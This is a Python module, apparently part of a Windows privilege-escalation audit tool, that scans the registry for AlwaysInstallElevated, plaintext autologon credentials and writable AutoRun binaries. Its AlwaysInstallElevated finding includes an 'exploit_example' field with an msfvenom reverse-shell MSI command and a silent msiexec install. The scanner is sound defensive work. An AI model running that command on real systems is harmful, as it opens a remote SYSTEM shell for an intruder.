"""
windows_registry_scanner.py — Detect registry-based privilege escalation vectors.

Checks:
  - AlwaysInstallElevated (MSI installs run as SYSTEM)
  - AutoRun keys writable by non-admins
  - Weak registry key permissions on sensitive keys
  - Stored credentials in registry (autologon passwords)
"""

import subprocess
import winreg as reg
import os


def _run_powershell(script: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
            capture_output=True, text=True, timeout=timeout,
            encoding="utf-8", errors="replace",
        )
        return r.stdout.strip()
    except Exception:
        return ""


def _query_reg(hive, key_path: str, value_name: str) -> str | None:
    """Read a registry value; return the data as string or None if missing."""
    try:
        with reg.OpenKey(hive, key_path) as k:
            data, _ = reg.QueryValueEx(k, value_name)
            return str(data)
    except (FileNotFoundError, OSError, PermissionError):
        return None


def _check_always_install_elevated() -> list[dict]:
    """AlwaysInstallElevated set in both HKLM and HKCU allows any MSI to run as SYSTEM."""
    findings = []

    hklm_val = _query_reg(
        reg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Policies\Microsoft\Windows\Installer",
        "AlwaysInstallElevated",
    )
    hkcu_val = _query_reg(
        reg.HKEY_CURRENT_USER,
        r"SOFTWARE\Policies\Microsoft\Windows\Installer",
        "AlwaysInstallElevated",
    )

    if hklm_val == "1" and hkcu_val == "1":
        findings.append({
            "category": "Windows Registry",
            "type": "AlwaysInstallElevated Enabled",
            "severity": "CRITICAL",
            "description": (
                "AlwaysInstallElevated is set to 1 in both HKLM and HKCU. "
                "Any user can install a crafted MSI package with SYSTEM privileges, "
                "providing a direct privilege escalation path."
            ),
            "mitigation": (
                "Disable the policy: Set AlwaysInstallElevated to 0 or remove it "
                "in both HKLM and HKCU via Group Policy (Computer/User Config → "
                "Administrative Templates → Windows Components → Windows Installer)."
            ),
            "details": {
                "hklm_value": hklm_val,
                "hkcu_value": hkcu_val,
                "exploit_example": (
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> "
                    "-f msi -o privesc.msi && msiexec /quiet /qn /i privesc.msi"
                ),
            },
        })
    elif hklm_val == "1" or hkcu_val == "1":
        findings.append({
            "category": "Windows Registry",
            "type": "AlwaysInstallElevated Partially Enabled",
            "severity": "MEDIUM",
            "description": (
                f"AlwaysInstallElevated is set in one hive only "
                f"(HKLM={hklm_val}, HKCU={hkcu_val}). "
                "Both keys must be 1 for exploitation, but this is a misconfiguration."
            ),
            "mitigation": "Set AlwaysInstallElevated to 0 in all hives.",
            "details": {"hklm_value": hklm_val, "hkcu_value": hkcu_val},
        })

    return findings


def _check_autologon_credentials() -> list[dict]:
    """Check for autologon plaintext credentials stored in the registry."""
    findings = []

    username = _query_reg(
        reg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "DefaultUserName",
    )
    password = _query_reg(
        reg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "DefaultPassword",
    )
    autologon = _query_reg(
        reg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "AutoAdminLogon",
    )

    if password:
        severity = "CRITICAL" if autologon == "1" else "HIGH"
        findings.append({
            "category": "Windows Registry",
            "type": "Autologon Credentials in Registry",
            "severity": severity,
            "description": (
                f"Autologon credentials found in Winlogon registry key. "
                f"Username: '{username}'. A plaintext password is stored and readable "
                "by any user who can query this key."
            ),
            "mitigation": (
                "Remove autologon credentials: delete DefaultPassword and set "
                "AutoAdminLogon to 0 in "
                r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            ),
            "details": {
                "username": username,
                "autologon_enabled": autologon == "1",
                "registry_key": r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            },
        })

    return findings


def _check_autorun_keys() -> list[dict]:
    """Check common AutoRun registry keys for writable or suspicious entries."""
    findings = []

    autorun_keys = [
        (reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKLM"),
        (reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "HKLM"),
        (reg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKCU"),
        (reg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU"),
    ]

    for hive, key_path, hive_name in autorun_keys:
        try:
            with reg.OpenKey(hive, key_path, access=reg.KEY_READ) as k:
                count = reg.QueryInfoKey(k)[1]
                for i in range(count):
                    try:
                        name, data, _ = reg.EnumValue(k, i)
                        # Check if the target binary is writable
                        import re
                        match = re.match(r'"([^"]+)"', str(data))
                        exe = match.group(1) if match else str(data).split()[0]
                        exe = exe.strip().strip('"')
                        if os.path.isfile(exe) and os.access(exe, os.W_OK):
                            findings.append({
                                "category": "Windows Registry",
                                "type": "Writable AutoRun Binary",
                                "severity": "HIGH",
                                "description": (
                                    f"AutoRun entry '{name}' in {hive_name}\\{key_path} "
                                    f"points to a writable binary: {exe}. "
                                    "Replacing this binary will execute arbitrary code at logon."
                                ),
                                "mitigation": (
                                    f"Fix permissions on {exe} or remove the AutoRun entry "
                                    f"if it is not required."
                                ),
                                "details": {
                                    "key": f"{hive_name}\\{key_path}",
                                    "entry_name": name,
                                    "binary": exe,
                                },
                            })
                    except OSError:
                        continue
        except (FileNotFoundError, PermissionError, OSError):
            continue

    return findings


def run(verbose: bool = False) -> list[dict]:
    """Entry point — returns list of registry-related privilege escalation findings."""
    if verbose:
        print("[*] Scanning Windows registry for privilege escalation vectors...")

    findings: list[dict] = []

    if verbose:
        print("    Checking AlwaysInstallElevated...")
    findings.extend(_check_always_install_elevated())

    if verbose:
        print("    Checking autologon credentials...")
    findings.extend(_check_autologon_credentials())

    if verbose:
        print("    Checking AutoRun keys...")
    findings.extend(_check_autorun_keys())

    if verbose:
        print(f"    Found {len(findings)} registry finding(s).")

    return findings
